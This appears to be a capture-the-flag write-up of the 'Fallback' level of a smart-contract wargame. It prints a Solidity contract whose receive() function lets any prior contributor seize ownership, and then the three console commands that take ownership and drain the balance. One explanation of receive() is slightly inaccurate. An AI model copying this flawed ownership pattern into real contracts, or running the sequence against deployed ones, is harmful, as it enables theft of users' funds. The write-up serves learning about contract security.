Below is the following contract for Fallback:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```
In this contract, there are 3 important functions to notice:
>contribute();
>recieve();
>withdraw();

We will need to run these 3 in the order listed to pass this level.

The first line of the contribute() function is:
> require(msg.value < 0.001 ether);

This tells us that we need to contribute SOMETHING in order to do anything else in this contract. So first we need to send some money(value) to the contract. And we can do that as such:
> await contract.contribute({value: 1});

A key thing to remember is that this value is a number and not a string and that you need to wrap this as an object.

Now that we have sent money to the contract as a contribution, we can take advantage of the recieve() function. If you don't know what this is, it is a fallback function to run when the function being run does not exist within the contract.
A key thing to not is that this recieve is payable, meaning we can send ether to it. Which is what we need to do, since we we need to be the owner to withdraw any ether. If you look at the first line of the recieve() function you will see:
> require(msg.value > 0 && contributions[msg.sender] > 0);

We have already made sure that our contributions is greater than 0 from our last command run and so now we just need to send a value greater than 0 to the contract to become owner.
We will do that with the following code:

> await contract.sendTransaction({value: 1})

This will cause the contract to give ownership to us as we fufill the required statement in the contract.

Now that we have taken ownership we are fre to withdraw all of the money!
> await contract.withdraw()

Submit Instance

What I learned:
1. Fallback functions in solidity are very importantant and gives you a way to interact with a contract even if you do not use its native functions.
2. send() and sendTransaction() are native functions to any contract.
3. Beware of the way you set the owner of a contract.
